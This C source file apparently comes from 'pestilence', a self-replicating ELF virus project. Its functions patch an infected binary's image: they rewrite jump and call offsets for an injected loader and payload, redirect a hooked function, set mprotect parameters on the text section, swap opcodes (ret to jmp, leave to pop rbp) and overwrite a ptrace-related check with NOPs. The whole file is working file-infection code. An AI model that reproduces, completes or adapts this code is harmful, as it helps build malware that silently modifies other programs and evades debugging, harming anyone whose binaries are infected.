#include "pestilence.h"

void		patch_loader(t_info *info, uint32_t hash)
{
	int32_t	start;
	int32_t	end;
	int32_t val;

	// rewrite addr for mprotect
	start = info->text_addr + info->text_size + /*E*/0xb3/*E`*/; // a modifier adresse de pos_rdi dans loader
	end = info->addr_bis;
	val = end - start;
	val = val - hash;
	ft_memcpy(info->text_begin + info->text_size + /*E*/0xb3/*E`*/ + 0x2, &val, 4); // 0x8c is pos of instruction targeted in loader;;; a modifier adresse de pos_rdi dans loader
}

void		patch_payload(t_info *info)
{
	int32_t	start;
	int32_t	end;
	int32_t	val;

	start = (int32_t)(info->addr_bis + PAYLOAD_SIZE + BIS_SIZE);
	end = info->addr_bis + /*A*/0x242/*A`*/; // ajouter l'addresse du milieu du bis
	val = end - start;

	// replace jmp addr
	ft_memcpy(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE - 4, &val, 4);
	// replace ret by jmp
	val = 0xe9;
	ft_memcpy(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE - 5, &val, 1);
	// replace leave by pop rbp
	val = 0x5dec8948;
	ft_memcpy(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE - 9, &val, 4);
	// replace adresse addr_text
	start = (int32_t)(info->addr_bis + BIS_SIZE + /*F*/0x3f4e/*F`*/);
	end = info->text_addr;
	val = end - start;
	ft_memcpy(info->file + info->offset_bis + BIS_SIZE + /*F*/0x3f4e/*F`*/ - 4, &val, 4);
}

void		patch_bis(t_info *info, int32_t nb)
{
	int32_t	start;
	int32_t	end;
	int32_t	val;

	// get addr of end of end
	start = info->addr_bis + BIS_SIZE;
	start += 5;
	if (nb == 1)
		start -= 0x38e;//REPLACE1
	if (nb == 2)
		start -= 0x2bd;//REPLACE2
	if (nb == 3)
		start -= 0x2b8;//REPLACE3
	if (nb == 4)
		start -= 0x387;//REPLACE4
	if (nb == 5)
		start -= 0x21a;//REPLACE5
	end = (int32_t)((size_t)(info->addr_hooked_func) - (size_t)(info->text_begin) + info->text_addr);
	val = end - start;
	if (nb == 1)
		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x38e/*REPLACE1*/ + 1, &val, 4);
	if (nb == 2)
		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x2bd/*REPLACE2*/ + 1, &val, 4);
	if (nb == 3)
		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x2b8/*REPLACE3*/ + 1, &val, 4);
	if (nb == 4)
		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x387/*REPLACE4*/ + 1, &val, 4);
	if (nb == 5)
		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x21a/*REPLACE5*/ + 1, &val, 4);
}

void		patch_addresses(t_info *info)
{
	int32_t		start;
	int32_t		end;
	int32_t		val;

	// &loader
	start = info->addr_bis + OFFSET_1 + 4;
	end = (int32_t)(info->text_addr + info->text_size);
	val = end - start;
	ft_memcpy(info->file + info->offset_bis + OFFSET_1, &val, 4);

	// &ft_memcpy
	start = info->addr_bis + OFFSET_2 + 4;
	end = (int32_t)(info->addr_bis + BIS_SIZE);
	val = end - start;
	ft_memcpy(info->file + info->offset_bis + OFFSET_2, &val, 4);

	// &syscalls
	start = info->addr_bis + OFFSET_3 + 4;
	end = (int32_t)(info->addr_bis);
	val = end - start;
	ft_memcpy(info->file + info->offset_bis + OFFSET_3, &val, 4);

	// &ptrace in main
	ft_memset(info->file + info->offset_bis + OFFSET_4, 40, '\x90');

	// size_text in mprotect_text
	val = info->text_size + 0x1000;
	ft_memcpy(info->file + info->offset_bis + OFFSET_5, &val, 4);

	// addr text in mprotect_text
	start = (size_t)(info->file) + info->addr_bis + OFFSET_5 + 0xb;
	end = (size_t)(info->file) + info->text_addr;
	val = end - start;
	ft_memcpy(info->file + info->offset_bis + OFFSET_5 + 0x7, &val, 4); // 0x3F is pos of instruction targeted in loader

	// open close_entries
	ft_memset(info->file + info->offset_bis + OFFSET_6, 5, '\x90');

	// remove in_pestilence
// 	ft_memset(info->file + info->offset_bis + OFFSET_7, 1, '\0');
	ft_memset(info->file + info->offset_bis + OFFSET_8, 1, '\0');
}
